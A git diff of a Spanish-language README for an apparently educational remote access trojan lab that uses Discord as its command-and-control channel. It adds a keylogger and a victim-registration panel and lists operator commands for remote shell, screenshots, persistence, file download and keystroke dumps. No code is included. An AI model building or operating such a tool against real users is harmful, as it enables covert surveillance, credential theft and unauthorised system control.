@@ -21,7 +21,7 @@ como canal de comunicación entre el atacante y la víctima.
 │  victim/        │────────▶│  Canal #general  │◀────────│  attacker/      │
 │  client.py      │         │                  │         │  bot.py         │
 │                 │◀────────│                  │────────▶│                 │
-│  5 módulos      │ recibe  │                  │  envía  │  Panel de       │
+│  6 módulos      │ recibe  │                  │  envía  │  Panel de       │
 │                 │ comandos│                  │ comandos│  control        │
 └─────────────────┘         └──────────────────┘         └─────────────────┘
 ```
@@ -40,10 +40,8 @@ como canal de comunicación entre el atacante y la víctima.
 ```
 rat-educational-lab/
 ├── attacker/                  # 🤖 Centro de comando (atacante)
-│   ├── bot.py                 #    Bot de Discord C2
+│   ├── bot.py                 #    Bot de Discord C2 (todo integrado)
 │   ├── .env                   #    Token y configuración (NO subir a git)
-│   ├── commands.py            #    Comandos del panel
-│   ├── config.py              #    Configuración
 │   ├── requirements.txt       #    Dependencias
 │   └── README.md
 │
@@ -54,7 +52,8 @@ rat-educational-lab/
 │   │   ├── persistence.py     #    Técnicas de persistencia
 │   │   ├── intelligence.py    #    Recopilación de información
 │   │   ├── discord_c2.py      #    Cliente C2 vía Discord
-│   │   └── commands.py        #    Ejecutor de comandos remotos
+│   │   ├── commands.py        #    Ejecutor de comandos remotos
+│   │   └── keylogger.py       #    Keylogger educativo (pynput)
 │   ├── requirements.txt       #    Dependencias
 │   └── README.md
 │
@@ -207,6 +206,21 @@ Salida esperada:
 
 En Discord aparecerá: *"C2 Server Iniciado — Esperando conexiones..."*
 
+Cuando una víctima se conecte, verás:
+
+```
+[2026-10-13 12:00:00] ATACANTE:BOT_INICIADO
+[2026-10-13 12:00:05] ATACANTE:NUEVA_SESION abc123
+```
+
+Y en Discord:
+
+```
+🔔 Nueva víctima conectada: abc123
+```
+
+La víctima envía un embed con: IP Pública, Sistema, Usuario y Admin.
+
 ### 3. Ejecutar el payload de la víctima
 
 En **otra terminal** (o en otra máquina):
@@ -219,10 +233,10 @@ python victim/client.py --token TU_TOKEN --channel TU_CHANNEL_ID
 > Para testing en sandbox, agrega `--allow-sandbox`
 
 La víctima se conectará y enviará un embed con:
-- Sistema Operativo
-- Usuario
 - IP Pública
-- RAM
+- Sistema Operativo
+- Usuario y si es Admin
+- Se registrará automáticamente en el panel del atacante
 
 ---
 
@@ -251,8 +265,6 @@ Los comandos se escriben en el canal de Discord con prefijo `!`:
 | Comando | Descripción |
 |---------|-------------|
 | `!screenshot` | Captura de pantalla |
-| `!webcam` | Foto de webcam |
-| `!record <segundos>` | Grabar audio |
 
 ### ⚙️ Sistema
 
@@ -260,32 +272,41 @@ Los comandos se escriben en el canal de Discord con prefijo `!`:
 |---------|-------------|
 | `!shell <comando>` | Ejecutar comando en la terminal |
 | `!processes` | Listar procesos activos |
-| `!kill <pid>` | Terminar un proceso |
 | `!info` | Información completa del sistema |
+
+### 🔍 Keylogger
+
+| Comando | Descripción |
+|---------|-------------|
+| `!keylog start` | Iniciar captura de teclas |
+| `!keylog stop` | Detener captura de teclas |
+| `!keylog_dump` | Obtener teclas capturadas y limpiar buffer |
 
 ### 🔧 Persistencia
 
 | Comando | Descripción |
 |---------|-------------|
 | `!persist` | Establecer persistencia en el sistema |
-| `!elevate` | Intentar elevación de privilegios |
 
 ### 🔄 Control
 
 | Comando | Descripción |
 |---------|-------------|
-| `!shutdown` | Apagar el sistema |
-| `!reboot` | Reiniciar el sistema |
 | `!exit` | Cerrar sesión del RAT |
-| `!help` | Mostrar todos los comandos |
+| `!help` | Mostrar todos los comandos de la víctima |
 
-### 🤖 Comandos del bot atacante
+### 🤖 Comandos del bot atacante (panel)
 
 | Comando | Descripción |
 |---------|-------------|
 | `!sessions` | Listar sesiones activas |
+| `!victim <id>` | Ver detalle de una víctima (IP, OS, usuario, admin) |
 | `!broadcast <msg>` | Enviar mensaje a todas las sesiones |
-| `!cleanup` | Limpiar sesiones inactivas |
+| `!keylog_dump` | Solicitar volcado del keylogger a todas las víctimas |
+| `!notify on/off` | Activar/desactivar notificaciones de nuevas víctimas |
+| `!cleanup` | Limpiar sesiones inactivas (>1 hora) |
+| `!info` | Información del bot (latencia, servidores, sesiones) |
+| `!help_c2` | Mostrar ayuda del panel |
 
 ---
 
@@ -321,7 +342,15 @@ Los comandos se escriben en el canal de Discord con prefijo `!`:
 - Captura de pantalla
 - Transferencia de archivos
 - Gestión de procesos
+- Keylogger (start/stop/dump)
 - Persistencia remota
+
+### 6. `keylogger.py` — Keylogger educativo
+- Captura teclas usando `pynput`
+- Buffer thread-safe con `threading.Lock`
+- Detecta caracteres especiales (Enter, Shift, Ctrl, etc.)
+- Estado con uptime y contador de teclas
+- Limpieza automática del buffer después del dump
 
 ---
 
@@ -337,15 +366,24 @@ Los comandos se escriben en el canal de Discord con prefijo `!`:
    └─▶ Fase 2: Establece persistencia
    └─▶ Fase 3: Recopila información del sistema
    └─▶ Fase 4: Se conecta a Discord
-   └─▶ Fase 5: Envía info al canal y entra en modo escucha
+   └─▶ Fase 5: Envía IP, OS, usuario y admin al canal
+   └─▶ Fase 6: Entra en modo escucha de comandos
 
 3. atacante escribe comandos en Discord
    └─▶ !shell whoami
    └─▶ !screenshot
+   └─▶ !keylog start
+   └─▶ !keylog_dump
+   └─▶ !victim <id>
    └─▶ !download C:\Users\victim\file.txt
 
 4. víctima ejecuta los comandos
    └─▶ Responde con resultados en Discord
+
+5. atacante monitorea el panel
+   └─▶ !sessions    → ver sesiones activas
+   └─▶ !notify on   → alertas de nuevas víctimas
+   └─▶ !info        → estado del bot
 ```
 
 ---
